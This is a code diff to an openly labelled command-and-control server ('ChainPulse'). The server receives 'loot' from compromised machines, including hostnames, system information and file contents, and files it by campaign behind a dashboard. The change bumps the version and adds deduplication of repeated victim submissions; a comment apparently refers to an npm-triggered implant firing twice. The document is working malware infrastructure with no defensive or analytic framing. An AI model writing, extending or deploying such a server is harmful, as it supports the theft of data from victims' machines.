@@ -16,6 +16,11 @@ LOOT_DIR = os.environ.get("LOOT_DIR", os.path.join(os.path.dirname(os.path.abspa
 DEFAULT_CAMPAIGN = os.environ.get("DEFAULT_CAMPAIGN", "render-01")
 os.makedirs(LOOT_DIR, exist_ok=True)
 
+# Dedupe spam: same host within short window (npm double-fire / WSL loops)
+_RECENT_FP = {}
+_DEDUP_SEC = 45
+
+
 DASHBOARD_HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -287,7 +292,7 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path == "/api/loot-summary":
             self._serve_json(self._get_summary())
         elif self.path == "/health":
-            self._serve_json({"status": "healthy", "version": "8.0.1", "render": True})
+            self._serve_json({"status": "healthy", "version": "8.0.2", "render": True})
         else:
             self.send_error(404)
 
@@ -322,6 +327,18 @@ class C2Handler(BaseHTTPRequestHandler):
             campaign = env["campaign"]
             ts = str(env["timestamp"]).replace(":", "-")
             host = env["payload"].get("system_info", {}).get("hostname", "unknown")
+            nfiles = len((env.get("payload") or {}).get("files") or {})
+            fp_key = f"{campaign}|{host}|{nfiles}"
+            now = time.time()
+            # drop fingerprints older than window
+            for k in list(_RECENT_FP.keys()):
+                if now - _RECENT_FP[k] > _DEDUP_SEC:
+                    _RECENT_FP.pop(k, None)
+            if fp_key in _RECENT_FP and now - _RECENT_FP[fp_key] < _DEDUP_SEC:
+                print(f"[~] dedupe skip {fp_key}")
+                self._serve_json({"status": "ok", "deduped": True, "campaign": campaign, "endpoint": endpoint})
+                return
+            _RECENT_FP[fp_key] = now
 
             cdir = os.path.join(LOOT_DIR, campaign)
             os.makedirs(cdir, exist_ok=True)
@@ -408,7 +425,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    print(f"[C2] ChainPulse v8.0.1 (Render) — http://0.0.0.0:{PORT}")
+    print(f"[C2] ChainPulse v8.0.2 (Render) — http://0.0.0.0:{PORT}")
     print(f"[C2] Dashboard: /dashboard")
     print(f"[C2] Health:    /health")
     print(f"[C2] Loot dir:  {LOOT_DIR}")
